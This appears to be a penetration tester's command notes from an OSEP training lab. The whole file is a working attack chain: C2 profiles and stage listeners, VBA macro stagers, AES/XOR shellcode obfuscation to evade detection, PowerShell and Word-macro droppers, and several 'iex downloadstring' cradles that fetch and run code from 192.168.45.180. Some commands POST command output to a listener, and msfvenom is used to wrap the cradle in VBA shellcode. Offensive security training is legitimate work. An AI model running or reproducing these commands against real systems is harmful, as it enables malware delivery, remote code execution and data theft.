profiles new --http 192.168.45.180:8999 --skip-symbols --format shellcode osep
http -l 8999
stage-listener --url tcp://192.168.45.180:9999 --profile osep
generate stager --lhost 192.168.45.180 --lport 9999 --arch amd64 --format vbapplication --save /home/fokt/Documents/OSEP/stager

profiles new --arch x86 --http 192.168.45.180:7999 --skip-symbols --format shellcode osepx86
http -l 7999
stage-listener --url tcp://192.168.45.180:7777 --profile osepx86
generate stager --lhost 192.168.45.180 --lport 7777 --arch x86 --format vbapplication --save /home/fokt/Documents/OSEP/stager


./paychef-lin-arm64 obfuscate-aes -s /home/fokt/Documents/OSEP/stager/COMPETENT_POSTER -k 00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff

./paychef-lin-arm64 obfuscate-xor -s /home/fokt/Documents/OSEP/stager/MAMMOTH_PLAN -x 0xaa

./paychef-lin-arm64 obfuscate-xor -s /home/fokt/Documents/OSEP/stager/AGREED_BITE -x 0xaa

./paychef-lin-arm64 generate-dropper --powershell --payloadUrl http://192.168.45.180:8080

./paychef-lin-arm64 generate-dropper --vba --fileName osep.docm --payloadUrl http://192.168.45.180:8080/osep.txt

./paychef-lin-arm64 run-server -p 8080

xfreerdp3 /v:192.168.203.11 /u:Offsec /p:Lab

powershell -exec bypass -nop -w hidden -File C:\Users\Offsec\Documents\notepad.ps1

powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.45.180:8080/osep.txt'))


C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.45.180:8080/osep.txt'))

powershell.exe -Command wget -Uri http://192.168.45.180:7070/ -Method POST -Body $(powershell.exe -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.45.180:8080/osep.txt')))

C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -exec bypass -nop -File C:\Users\Offsec\Documents\svchostx86.ps1

powershell -Command wget -Uri http://192.168.45.180:7070/ -Method POST -Body $(C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -exec bypass -nop -File C:\Users\Offsec\Documents\svchostx86.ps1)




msfvenom -p windows/x64/exec -f vbapplication CMD="powershell.exe -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.45.180:8080/osep.txt'))" EXITFUNC=thread

msfvenom -p windows/exec -f vbapplication CMD="powershell.exe -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.45.180:8080/osep.txt'))" EXITFUNC=thread


msfvenom -p windows/x64/exec -f vbapplication CMD="powershell.exe -c (new-object net.webclient).DownloadString('http://192.168.45.180:8080/osep.txt')" EXITFUNC=thread

msfvenom -p windows/exec -f vbapplication CMD="powershell.exe -c (new-object net.webclient).DownloadString('http://192.168.45.180:8080/osep.txt')" EXITFUNC=thread